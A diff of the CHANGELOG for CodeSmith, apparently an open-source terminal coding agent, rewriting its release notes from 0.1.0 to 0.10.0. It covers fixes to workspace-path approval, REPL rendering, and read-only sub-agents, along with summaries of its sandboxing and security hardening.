-- **A workspace-escape refusal now names the way out**: `read_file`, `list_dir`,
-  and the other file tools refused an absolute path outside the workspace with
-  nothing but `path escapes workspace` — the `ToolError::PathEscape` `Display`
-  that the model-visible transcript (`engine/turn/batches.rs`) and the REPL line
-  (`interactive/render.rs`) both print. A session asked to compare its checkout
-  against a sibling repository therefore stalled: the model reported the refusal
-  and stopped, and the user never learned the one command that unblocks it. The
-  message now carries the exact `/trust add <path>` inline — the same remedy
-  `docs/SUBAGENTS.md` promises for a sub-agent `cwd` — plus the
-  workspace-relative alternative. The orphaned `format_tool_error` copy of that
-  advice, which recommended the wider `/trust on` and had no production caller
-  left after the TUI's removal, now delegates to the `Display`, so one string
-  owns the remedy.
-- **The REPL's live status line no longer shares a row with permanent text**:
-  the transient in-turn line is drawn on stderr with no leading `\r` and no
-  erase of its own, relying on an earlier `ESC[2K CR` that only happens when
-  the line is marked active. Two writers then styled the same row: a frame
-  drawn into an open row glued itself to streamed assistant text, and the next
-  frame's `ESC[2K` erased that text with it — a pty capture of the old build
-  reduced four streamed lines to `first.` before the approval prompt. A live
-  frame is now a whole-row write (close any open permanent row, then `CR`
-  + erase-to-end-of-line + the frame), and the approval/choice prompts
-  terminate their own row when stdin is not a terminal (or the answer ended in
-  EOF), where no echo newline arrives.
-- **Collapsed tool lines pair each completion with its own arguments**: the
-  pending tool call was a single `(name, args)` slot matched by name, so one
-  message carrying two calls of the same tool — two `agent_open` calls, one per
-  repository — printed the *last* call's arguments on the *first* completion
-  line (and vice versa). Pending calls are now keyed by tool-call id.
-- **`explore` is read-only in fact, not only in prose**: the type is documented
-  as read-only (`agent-runtime::subagent`, `docs/SUBAGENTS.md`) and the prompts
-  point at it for parallel sweeps, but it received the full Agent tool surface
-  unless a caller narrowed it. The registry now intersects the type's tools
-  with the read-only names of its own registry, so `write_file`, `edit_file`,
-  and `exec_shell` are neither visible nor callable; asking for a write tool in
-  `allowed_tools` fails the spawn with the refused names instead of silently
-  dropping them. The narrowing also drops the spawn family — an explorer is a
-  leaf.
-- **Approving an out-of-workspace path now runs the call that asked**: a
-  read-only tool (`read_file`, `list_dir`, `grep_files`) pointed outside the
-  workspace was speculatively started while the model was still streaming — the
-  early-tool-start path gates on static capabilities only — so it had already
-  failed with `path escapes workspace` before the `⚠ path outside the
-  workspace` question was shown. Answering `[y]`/`[a]` granted the path and
-  persisted it, but the serial batch then reused that pre-approval failure
-  instead of re-running the call, and the transcript reported the refusal the
-  user had just allowed. Speculative dispatch now reads the same approval
-  predicate as the execution planner (`turn::approval::input_requires_approval`,
-  the single definition both sites share), so a gated call — an escaped path, or
-  a dispatcher answering `Required`/`Suggest` for this input — never runs before
-  the answer, and a gated call never reuses a speculative result. The grant
-  itself was never wrong: `workspace-trust.json` and the in-process live list
-  were being written correctly all along.
+- A truncated tool call no longer poisons every later request; a path approval
+  runs the call that asked; collapsed tool lines pair each completion with its
+  own arguments; the live status line no longer shares a row with streamed
+  text. Security and bug sweeps across every crate: execpolicy precedence,
+  sandbox roots, path confinement, secret redaction, stream back-fill.
 
 ## [0.9.0] - 2026-10-09
 
-### Removed
+### Added
 
-- **The ratatui TUI and the `codesmith-tui` companion binary.** CodeSmith is
-  now a single `codesmith` executable: a Claude Code / Codex style line-based
-  REPL is the interactive frontend, and every headless subcommand
-  (exec/doctor/serve/mcp/…) runs in-process. The status line above the prompt
-  shows the session facts (running state, preset tier, context-window
-  occupancy, mode, running sub-agents, model, version), sessions auto-save at
-  each turn boundary, and the slash-command surface carries over (view-bound
-  commands degrade to explicit notes). Release channels — npm, brew, Docker,
-  nix, GitHub assets, self-update — ship the one binary; installs updating
-  from a two-binary release need a one-time reinstall.
-- The terminal-chrome flags `--no-alt-screen`, `--mouse-capture`, and
-  `--no-mouse-capture` (alt screen, mouse capture, and bracketed-paste are
-  gone with the TUI), the `[tui]` and `[notifications]` config tables, and
-  the `~/.codesmith/tui.toml` preferences file. Turn notifications remain
-  available through the model-callable `notify` tool. Unknown keys in old
-  config files are ignored on load.
-- The `KEYBINDINGS` and `ACCESSIBILITY` guide pairs under `docs/` — the
-  line-based REPL uses the terminal's native editing keys and scrollback,
-  so there is no custom keymap or screen-reader interaction surface to
-  document.
+- The framework/implementation crate split with a dependency-direction guard,
+  and the seams it enables: `register_provider`, deny-only tool guards, mod
+  skills in the catalogue, named system-prompt sections, record/replay of LLM
+  envelopes, an event-dispatch contract table, and a capability graph that
+  governs tool selection for the session and for sub-agents.
+
+- Session persistence: the per-step request envelope, the compaction fact
+  ledger, and the todo/plan projections all survive a restart, and `ToolResult`
+  carries a canonical value beside its rendered text.
+
+### Changed
+
+- Compaction keeps facts — a ledger, a reflection loop that turns failures into
+  invariants, a deliverables watchdog, a skeleton-first statute — and the guard
+  pipeline lands: docs-pair drift and the dead-code budget are now checked.
+
+## [0.8.0] - 2026-10-04
+
+### Changed
+
+- CI becomes a real gate: `-D warnings` is enforced with rustfmt and the
+  cross-target std in the pinned toolchain, the first clean pass surfaced
+  failures that had been masked, and fixture-dylib resolution, Windows path
+  semantics, MCP session teardown, web_run state sharing, and a freshly-booted
+  `Instant` underflow were repaired (Windows AV quarantine where unresolvable).
+
+- The CNB mirror sync workflow is removed; `AGENTS.md` is tracked instead of
+  ignored, and the CI facts it carried are pruned.
+
+### Added
+
+- TUI readline parity: kill ring, undo, and `!` shell lines.
+
+## [0.7.0] - 2026-10-03
+
+### Added
+
+- The Rhai mod layer: hooks, model-callable tools, slash commands, mod
+  self-install, an activation gate, and hot reload — with `docs/MODS.md`
+  rewritten tutorial-first around verified minimal snippets and split into the
+  bilingual pair `MODS.md` / `MODS_cn.md`.
+
+### Fixed
+
+- Clippy warnings cleared across agent-runtime, the config env lock tolerates
+  poisoning, and the MCP no_proxy loopback and nvidia-nim tests are aligned
+  with the behavior they cover.
+
+## [0.6.0] - 2026-10-03
+
+### Added
+
+- Static command analysis over a real bash AST (tree-sitter), so compound
+  commands are decomposed before policy decides and a dangerous segment cannot
+  hide behind a friendly prefix; tier-based routing on the strongest configured
+  brain; an environment-gated rate-limit hold that keeps a quota-walled turn
+  alive instead of failing it.
+
+### Changed
+
+- `max_steps` collapses into one constant (`DEFAULT_MAX_STEPS`, raised to 1024),
+  GLM-1214 outbound messages are sanitized, and DeepSeek usage frames default
+  their missing `prompt_cache_*` fields.
+
+## [0.5.0] - 2026-09-27
+
+### Added
+
+- Layered configuration presets (simple / middle / all / experiment) that fill
+  only unset keys and keep a `diy` deviation state — the `modes` → `presets`
+  rename included — plus a result-claim verifier that replays a turn's
+  test/build claims into four-element verdicts and an evolution jsonl log that
+  `/verify` reads for the claim-match rate.
+
+- An advisory doctor fallback that root-causes findings with a model, and
+  offline MEMORY.md sleep learning that consolidates memory through a validated
+  merge.
+
+### Fixed
+
+- Security hardening from a full-repo review: sandbox runs fail closed and
+  report honestly, execpolicy resolves compound-command segments, path
+  traversal and memory/skill trust bounds are enforced, locks tolerate
+  poisoning, and writes are atomic.
+
+## [0.4.0] - 2026-09-26
+
+### Added
+
+- Parse-gated editing: a pre-write syntax gate rejects a write that would break
+  a file which parsed cleanly before the edit — reporting line and column and
+  leaving the file untouched — and re-normalizes rustfmt-clean Rust afterwards
+  so patch anchors stay stable. `Cargo.lock` is exempt and a missing rustfmt
+  never blocks a write.
+
+- A length-stop gate that refuses to repair or execute a tool call truncated by
+  the output limit, and a stream termination proof: `MessageStop` is required
+  before a round counts as complete, `stop_reason` is derived rather than
+  assumed, and a repeated HTTP/2 protocol failure falls back to HTTP/1.1.
+
+### Changed
+
+- The three-zone prompt contract is wired into the engine's request path, and
+  clippy violations blocking `-D warnings` builds are repaired.
+
+## [0.3.0] - 2026-09-23
+
+### Fixed
+
+- Three review rounds over the v0.2.0 features: billed tokens commit at the
+  right stream boundary, context-length errors recover mid-stream instead of
+  ending the turn, transient 5xx responses retry, and spillover handles its
+  Running, stale, and pid states.
+
+- Persisted grants are re-checked on lookup with `never`-mode precedence,
+  `edit_file` matchers are UTF-8 safe, and the merged grants store writes
+  atomically; freshness dedup, refill accounting, and usage-anchor invalidation
+  are corrected.
+
+## [0.2.0] - 2026-09-23
+
+### Added
+
+- Named runtime modes as one-file dial bundles that hot-switch mid-session,
+  a session-aware working directory, `edit_file` anchor mode, and persistent
+  approval grants that survive a restart.
+
+- Adaptive stream retry, shell-output spillover to a file when a result is too
+  large, stale-read hints, and usage-anchored context estimates behind a
+  rapid-refill guard.
+
+### Fixed
+
+- Sandbox, secret, and tool-path hardening from a full-repo review, with stream
+  liveness, provenance, and network defaults tightened alongside.
 
 ## [0.1.0] - 2026-08-25
 
 ### Added
 
-- Initial public release of **CodeSmith**, a terminal coding agent for
-  open-source and open-weight coding models (DeepSeek, Moonshot, OpenAI,
-  Anthropic, NVIDIA NIM, OpenRouter, SiliconFlow, Fireworks, Novita, vLLM,
-  SGLang, Ollama, and any OpenAI-compatible gateway).
-- Matched binary pair: `codesmith` dispatcher CLI + `codesmith-tui` runtime.
-- Streaming chat with reasoning-block rendering and per-turn thinking levels.
-- Auto mode that selects model and thinking effort per turn.
-- Approval-gated workspace editing, sandboxed shell execution, and YOLO mode.
-- MCP client support, persistent task/session state, sub-agent teams, and a
+- First public CodeSmith release: a terminal coding agent for open-source and
+  open-weight models — DeepSeek, Moonshot, OpenAI and Anthropic compatible
+  gateways, NVIDIA NIM, OpenRouter, SiliconFlow, Fireworks, Novita, vLLM,
+  SGLang, Ollama — with streaming chat that renders reasoning blocks, per-turn
+  thinking levels, auto mode, approval-gated workspace editing, a sandboxed
+  shell, YOLO mode, MCP clients, persistent sessions, sub-agent teams, and a
   local skill registry.
-- npm installer package, Homebrew tap, Docker image, and Nix packaging.
 
-[Unreleased]: https://github.com/camilesing/CodeSmith/compare/v0.10.0...HEAD
-[0.10.0]: https://github.com/camilesing/CodeSmith/compare/v0.9.0...v0.10.0
-[0.9.0]: https://github.com/camilesing/CodeSmith/compare/v0.8.0...v0.9.0
-[0.1.0]: https://github.com/camilesing/CodeSmith/releases/tag/v0.1.0
+- Shipped as the matched `codesmith` dispatcher plus `codesmith-tui` runtime
+  pair, with an npm installer, a Homebrew tap, a Docker image, and Nix
+  packaging.
